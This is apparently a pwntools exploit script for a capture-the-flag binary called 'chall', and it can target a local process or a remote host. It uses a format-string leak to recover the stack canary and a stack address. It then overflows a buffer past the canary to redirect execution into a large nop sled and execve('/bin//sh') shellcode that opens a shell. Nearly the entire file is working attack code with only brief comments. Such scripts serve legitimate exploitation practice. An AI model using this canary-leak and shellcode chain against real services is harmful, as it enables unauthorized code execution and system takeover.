from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def solve(self):
        # First leak canary, then leak some kind of stack address
        p = self.p
        p.sendline("%77$p.%p")
        p.recvuntil("You entered: ")
        l = p.recvline(keepends=False)
        canary, stack_addr = [int(x, 16) for x in l.split(b".")]

        # Some large offset (doesn't really need to be very precise because of the massive nop sled)
        stack_addr += 0x1eb0+0x554+0x500
        log.info(f"{hex(canary)=}")
        log.info(f"{hex(stack_addr)=}")
        p.sendline("yes")

        # Massive nop sled!
        sc = asm(f"""
        {"nop;"*2000}
        push rax
        xor rdx, rdx
        xor rsi, rsi
        movabs rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        mov al, 0x3b
        syscall
        """)
        payload = flat(
            cyclic(520),
            canary,
            b"A"*8,
            stack_addr,
            sc
        )
        p.sendline(payload)


x, p = init()

x.solve()

p.interactive()
